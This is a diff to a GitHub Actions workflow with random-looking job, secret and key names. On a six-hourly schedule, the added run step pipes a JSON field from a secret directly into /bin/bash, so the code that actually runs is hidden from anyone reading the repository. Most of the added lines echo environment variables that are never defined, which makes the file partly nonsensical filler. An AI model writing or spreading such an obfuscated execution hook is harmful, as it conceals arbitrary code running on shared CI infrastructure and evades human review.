@@ -2,22 +2,27 @@ name: ghaudhl
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 2/6 * * *'
-
-jobs:  # 18030
+    - cron: '12 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: ghaudhl
         env:
-          c51: ${{ secrets.c51 }}
+          req05953: ${{ secrets.req05953 }}
         run: |
-          echo $c51 | jq -r .m802 | /bin/bash
-          echo $w64 | jq -r .thkgv20 | /bin/bash
-          echo $zxv27531 | jq -r .bgkv2 | /bin/bash
-          echo $ma0 | jq -r .rg09 | /bin/bash
-          echo $f64 | jq -r .owh478 | /bin/bash
-          echo $sl854 | jq -r .yij689 | /bin/bash
-          echo $db71 | jq -r .alqx0879 | /bin/bash
+          echo $req05953 | jq -r .khhb01 | /bin/bash
+          echo $n7 | jq -r .duu8 | /bin/bash
+          echo $zkrg16080 | jq -r .xtzdx630 | /bin/bash
+          echo $ypa537 | jq -r .uhfop98 | /bin/bash
+          echo $d3 | jq -r .dzlr4 | /bin/bash
+          echo $jahjv6 | jq -r .qx06085 | /bin/bash
+          echo $aookf0137 | jq -r .vdfxp867 | /bin/bash
+          echo $lnhzf5 | jq -r .xomtm632 | /bin/bash
+          echo $bkl5 | jq -r .h00 | /bin/bash
+          echo $lkm23317 | jq -r .n2 | /bin/bash
+          echo $avws42 | jq -r .uvn8942 | /bin/bash
+          echo $tz16944 | jq -r .pk4151 | /bin/bash
+          echo $wm6 | jq -r .a0 | /bin/bash
 
